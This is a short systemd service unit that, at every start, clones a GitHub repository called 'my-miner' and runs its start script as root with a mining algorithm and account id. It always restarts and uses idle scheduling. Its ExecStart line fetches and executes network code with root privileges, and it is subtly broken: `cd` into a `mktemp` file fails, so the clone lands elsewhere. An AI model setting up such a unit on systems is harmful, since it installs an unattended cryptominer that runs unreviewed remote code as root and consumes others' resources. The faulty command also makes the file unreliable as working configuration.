[Unit]
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=bash -c 'cd `mktemp`; git clone https://github.com/shynur/my-miner build; ./build/start.bash -a rx -u shynur996.seer_server'

Restart=always
RestartSec=10

# Work-conserving background scheduling; deliberately no quota or CPU affinity.
Nice=19
CPUSchedulingPolicy=idle
CPUWeight=1

IOSchedulingClass=idle
IOSchedulingPriority=7
IOWeight=1

OOMScoreAdjust=1000

User=root
Group=root

[Install]
WantedBy=multi-user.target
